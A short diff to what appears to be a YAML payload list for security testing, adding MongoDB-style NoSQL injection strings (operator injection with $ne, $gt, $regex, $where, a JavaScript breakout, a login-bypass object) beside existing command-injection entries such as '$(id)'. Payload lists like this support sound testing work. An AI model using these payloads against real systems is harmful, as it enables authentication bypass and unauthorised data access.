@@ -45,3 +45,15 @@ command_injection:
   - "&& id"
   - "$(id)"
   - "`id`"
+
+nosql_injection:
+  # MongoDB-style operator injection. These rely on the server passing
+  # the parameter into a Mongo query without coercing to string.
+  - "true, $where: '1 == 1'"
+  - "{\"$ne\": null}"
+  - "{\"$ne\": \"\"}"
+  - "{\"$gt\": \"\"}"
+  - "{\"$regex\": \".*\"}"
+  - "'||'1'=='1"
+  - ';return true;var x="'
+  - "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
